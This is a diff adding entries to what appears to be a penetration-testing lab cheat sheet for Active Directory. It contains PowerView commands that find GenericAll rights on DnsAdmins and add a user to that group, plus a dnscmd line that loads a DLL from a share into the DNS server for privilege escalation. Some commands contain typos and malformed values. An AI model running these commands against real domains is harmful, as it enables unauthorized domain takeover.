@@ -4,13 +4,32 @@
 
 ## ACL - Generic All
 
+```powershell
+Get-ObjectAcl -SamAccountName DnsAdmins -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll')}
+
+Get-ObjectAcl -SamAccountName DnsAdmins -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'S-1-55465134614643146434643614646467'}
+```
+Adding yourself as a member
+
+```powershell
+Add-DomainGroupMember -Identity 'DnsAdmins' -Members 'student1' 
+Get-DomainUser -name 'student1'
+Get-DomainGroup -SamAccountName DnsAdmins
+```
+
 ## ACL - GenericWrite on User
 
 ## PrintNightmare (CVE-2021-34527)
 
-## DNS Admins 
+## PrivEsc - DNS Admins 
 
-## DCSync
+```powershell
+dnscmd dc.pentesting.local /config /serverlevelplungindll \\student\share\privesc.dll
+
+
+```
+
+## DCSync0
 
 ## ZeroLogon (CVE-2020-1472)
 
